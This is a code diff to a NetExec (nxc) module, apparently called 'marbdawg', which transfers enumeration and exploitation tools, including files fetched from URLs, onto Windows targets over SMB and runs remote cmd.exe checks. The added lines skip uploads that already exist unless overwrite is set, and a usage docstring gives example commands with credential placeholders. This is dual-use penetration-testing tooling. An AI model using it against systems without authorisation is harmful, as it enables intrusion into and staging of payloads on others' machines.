@@ -14,7 +14,22 @@ class NXCModule:
     multiple_hosts = True
 
     def options(self, context, module_options):
-        """Configure module options."""
+        """
+        LOCAL           Enable/Disable Local Mode (True/False; default: True)
+        MODE            Deployment mode (custom, all, enum, exploit, pingcastle; default: all)
+        DIR             Remote directory for tool transfer (default: C:\\Windows\\Tasks\\)
+        OVERWRITE       Overwrite existing files on target (True/False; default: False)
+        CUSTOM          Custom tools (file path, directory, or comma-separated URLs)
+
+        nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=enum
+        nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=enum DIR=C:/Windows/Temp/
+        nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=pingcastle
+        nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=custom CUSTOM=/path/to/tools/
+        nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=custom CUSTOM=/path/to/agent.exe
+        nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=custom CUSTOM=https://example.com/tool1.exe,https://example.com/tool2.exe
+        nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=pingcastle OVERWRITE=True
+        nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o LOCAL=False MODE=exploit
+            """
         self.LOCAL = module_options.get("LOCAL", "True")
         self.MODE = module_options.get("MODE", "all").lower()
         self.location = module_options.get("DIR", "C:\\Windows\\Tasks\\")
@@ -292,6 +307,15 @@ class NXCModule:
                     for filename in files:
                         local_path = os.path.join(root, filename)
                         remote_path = f"{self.location}{filename}".replace("/", "\\")
+                        
+                        # Check if the file exists on the target
+                        check_command = f'cmd.exe /c "if exist {remote_path} (echo {filename} exists) else (echo {filename} not found)"'
+                        output = connection.execute(check_command, True)
+                        
+                        if "exists" in output and not self.overwrite:
+                            context.log.highlight(f"{filename} already exists on target, skipping upload.")
+                            continue
+
                         context.log.highlight(f"Transferring {local_path} to {remote_path}...")
                         try:
                             with open(local_path, "rb") as file_stream:
@@ -306,17 +330,25 @@ class NXCModule:
             elif os.path.isfile(path):
                 filename = os.path.basename(path)
                 remote_path = f"{self.location}{filename}".replace("/", "\\")
-                context.log.highlight(f"Transferring single file {path} to {remote_path}...")
-                try:
-                    with open(path, "rb") as file_stream:
-                        connection.conn.putFile(
-                            "C$",
-                            remote_path.replace("C:\\", ""),
-                            file_stream.read
-                        )
-                    context.log.highlight(f"Successfully transferred {filename} to {remote_path} on the target.")
-                except Exception as e:
-                    context.log.fail(f"Failed to transfer {filename}: {e}")
+                
+                # Check if the file exists on the target
+                check_command = f'cmd.exe /c "if exist {remote_path} (echo {filename} exists) else (echo {filename} not found)"'
+                output = connection.execute(check_command, True)
+                
+                if "exists" in output and not self.overwrite:
+                    context.log.highlight(f"{filename} already exists on target, skipping upload.")
+                else:
+                    context.log.highlight(f"Transferring single file {path} to {remote_path}...")
+                    try:
+                        with open(path, "rb") as file_stream:
+                            connection.conn.putFile(
+                                "C$",
+                                remote_path.replace("C:\\", ""),
+                                file_stream.read
+                            )
+                        context.log.highlight(f"Successfully transferred {filename} to {remote_path} on the target.")
+                    except Exception as e:
+                        context.log.fail(f"Failed to transfer {filename}: {e}")
             else:
                 # Otherwise, assume we have one URL
                 self._download_and_display(context, connection, [path])
@@ -337,9 +369,25 @@ class NXCModule:
                 with open(local_path, "wb") as file:
                     file.write(response.content)
                 
-                context.log.display(f"Successfully downloaded {tool_name} to {local_path}.")
+                # Check if the file exists on the target
+                remote_path = f"{self.location}{tool_name}".replace("/", "\\")
+                check_command = f'cmd.exe /c "if exist {remote_path} (echo {tool_name} exists) else (echo {tool_name} not found)"'
+                output = connection.execute(check_command, True)
+                
+                if "exists" in output and not self.overwrite:
+                    context.log.highlight(f"{tool_name} already exists on target, skipping upload.")
+                    continue
+
+                context.log.highlight(f"Transferring {local_path} to {remote_path}...")
+                with open(local_path, "rb") as file_stream:
+                    connection.conn.putFile(
+                        "C$",
+                        remote_path.replace("C:\\", ""),
+                        file_stream.read
+                    )
+                context.log.highlight(f"Successfully transferred {tool_name} to {remote_path} on the target.")
             except Exception as e:
-                context.log.fail(f"Failed to download {tool_url}: {e}")
+                context.log.fail(f"Failed to transfer {tool_url}: {e}")
 
     def download_tools(self, context, connection, tools):
         """Helper function to download and save tools to the target system."""
